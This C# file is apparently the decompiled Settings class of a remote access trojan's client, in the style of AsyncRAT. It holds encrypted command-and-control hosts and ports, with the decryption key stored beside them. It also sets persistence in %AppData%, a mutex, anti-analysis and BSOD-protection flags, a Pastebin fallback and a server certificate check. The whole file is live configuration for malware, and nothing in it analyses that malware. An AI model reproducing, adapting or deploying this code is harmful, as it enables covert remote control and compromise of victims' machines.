using System;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using Client.Algorithm;
using Client.Helper;

namespace Client;

public static class Settings
{
	public static string Ports = "m53Vtr8fVYuErH/m+BhBzJ5rHP6dwe2bgRW7A1i6JNAwSMVw84ZBTlKzj4OitcM3j+xKN6aexIyfwjdko1b8HQ==";

	public static string Hosts = "RhiIORqGxDyglru3AhNWlPjF98oQbC91dwdYhW7xExM20ZlBXkUKc4KMV55JPpMJuY6uY7D8bdzP4q550kxNIA==";

	public static string Version = "VkAMJBwKWDxPGU3XGdpGDudYJFyGU2qhYSIrciIguKrIJKSo54UIgnYcVhSdWEa8tjwr2+/dY2OfnNTwUof61Q==";

	public static string Install = "ReRgbBZ5qIyyUVGA1//51SdLmqsH4he4rcQGREJcqyvaEyFpc8xfhiFskCfoT6sX2xjcI9P4w5DYo6rK0mxlFg==";

	public static string InstallFolder = "%AppData%";

	public static string InstallFile = "";

	public static string Key = "aWtaMTVFOVdoMVo5TFh0TERJRnhrTmx2cXBoWGhVaUQ=";

	public static string MTX = "nTA99uAp0eR9FuMukBUlGU8zjUPe2PgiOqG4Ng3aooo8FM3Zg99JscbNvsF291wmfQ4I3ezUVvzdXHo7XDqO0vMfrJQFVKr8/Qzxo2u9QhE=";

	public static string Certificate = "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";

	public static string Serversignature = "/RTVKf7p37vucP9lH75szbdNfqfNv0G7ykc04f5v3fL1WbGwk10u2vFW4Ip7HY2B2tsCItFPKM5NvdmpAq4JpTXFYLNleEzn01Duojz2sR2Qy3CBWOazc2REo08qdqUSBFuSnz64Nw/lB66oYz5nY/ml9mirTGVRpWCrlcdL2VsIQRfmj7TTRaVD8gxk63unKVb9xGNl3T7vaUwkFFVDjBdoKlx6MEtRJfehmptUdRgTb48K324WxpWczuwuMHuOGdi1GyPEuT/qPXQpq8uzvvzZD1kQZiKZEsOWy7F5Frg9ut70iM3bqqAT4elqV7dVqpjjdIj7Je1k7laUWRk604UGumKuRxPGi2KmpDZ4uQRpXtFN/CXJDWAFrNdYvsoACbJ429tuYStCtG5acxKpl9X4zF/kJPMX9vMGNmmwavIvc7y0oOkU7SbUlpUCcDUilkpNBbTxLVi054CRgaDh9rg0zUTMx7RS0gC9RbK1dyZGyoLzTn0QjK/Bn58mrwLnu/xAsoghyiloe+vMJkvkuWpee20uVkt87Ucq35Fbsr8BQa42okbfbLtYuLcykTz1DfiASNBEV6VrfMR8mPFickr5haPF5Gw8S3MzVw2VBuatIYiQaVbpGQJ+7PaaEWkJQC/LbfCcOTaQTFxZKhthvRmWisUucWVqWtoqH5jTiHcMaMH4U7Gi8tYeDwfc+o7rmMkeK5M6wdmoWezGHIyoc2ShexaUbKVqJFWlSEsMKUBQD5JWGkPck3vvD2C/po9R9ocgQtEXFNA8agJUOp/Pw9xGMMTgMFRD2um/fS8WBsxQGVOFqBXnhI83N6UrIUx6IuwLt7gCwdSIRu87dU6Leair2GqOTzHy718YCjPepF9UKyph/eEpXfIvVMI1mh9r6Xf8ZVkcbHXKKta6hZ+Wa/YRTPYWKUSYarkiK6319oW0m33zV5Ia80XM+imZLVbAeeXF9TZ8CuLAujK1V4XsRA==";

	public static X509Certificate2 ServerCertificate;

	public static string Anti = "WLta8NLhHERw+Sew8O70sIDZ1AKfmWfdHVbvnzGSnczdY4CFt3Tu7iOmTl8exZauKO6V6Fgp0sPztLZ+RtXdLA==";

	public static Aes256 aes256;

	public static string Pastebin = "llN83ujiZzDgJCVHW2Gni47W1YXXx9xywSpyijTI9SJYX05BxnC23WYnjMkMBN236w3UWEed36NvCgSiYgDTZg==";

	public static string BDOS = "YbDtervpQX53+foreskgD/6c4Rzp+bLVeLhj4kVikDcY7IXVOKWhKdi5G2ajpRNsqL1aRyRlignCyucIKgRY9Q==";

	public static string Hwid = null;

	public static string Delay = "3";

	public static string Group = "a6MBBG0GYhxqW5VJykMiO0sABAWWMfYY7ZlCowIzy2vN5RIwspSzPdLFbXWsAveZ5DJ+PPnilpMj9exf61dmBA==";

	public static bool InitializeSettings()
	{
		try
		{
			Key = Encoding.UTF8.GetString(Convert.FromBase64String(Key));
			aes256 = new Aes256(Key);
			Ports = aes256.Decrypt(Ports);
			Hosts = aes256.Decrypt(Hosts);
			Version = aes256.Decrypt(Version);
			Install = aes256.Decrypt(Install);
			MTX = aes256.Decrypt(MTX);
			Pastebin = aes256.Decrypt(Pastebin);
			Anti = aes256.Decrypt(Anti);
			BDOS = aes256.Decrypt(BDOS);
			Group = aes256.Decrypt(Group);
			Hwid = HwidGen.HWID();
			Serversignature = aes256.Decrypt(Serversignature);
			ServerCertificate = new X509Certificate2(Convert.FromBase64String(aes256.Decrypt(Certificate)));
			return VerifyHash();
		}
		catch
		{
			return false;
		}
	}

	private static bool VerifyHash()
	{
		try
		{
			return ((RSACryptoServiceProvider)ServerCertificate.PublicKey.Key).VerifyHash(Sha256.ComputeHash(Encoding.UTF8.GetBytes(Key)), CryptoConfig.MapNameToOID("SHA256"), Convert.FromBase64String(Serversignature));
		}
		catch (Exception)
		{
			return false;
		}
	}
}
